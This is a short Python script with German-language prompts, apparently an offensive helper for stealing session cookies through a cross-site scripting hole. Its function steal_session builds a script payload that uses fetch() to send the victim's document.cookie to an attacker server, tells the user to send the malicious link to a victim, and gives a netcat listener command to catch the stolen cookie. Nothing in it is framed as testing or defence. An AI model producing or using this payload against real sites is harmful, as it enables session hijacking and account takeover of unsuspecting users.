import requests

def steal_session():
    target = input("🎯 Ziel-URL mit XSS-Lücke (z.B. 'http://test.com/search?q='): ")
    evil_js = "<script>fetch('http://dein-server/steal?cookie='+document.cookie)</script>"
    
    print(f"📤 Sende bösartigen Link an Opfer: {target}{evil_js}")
    print("⚠️ Starte eigenen Server mit: nc -lvnp 80")
    print("ℹ️ Wenn das Opfer den Link besucht, erhältst du dessen Session-Cookie!")
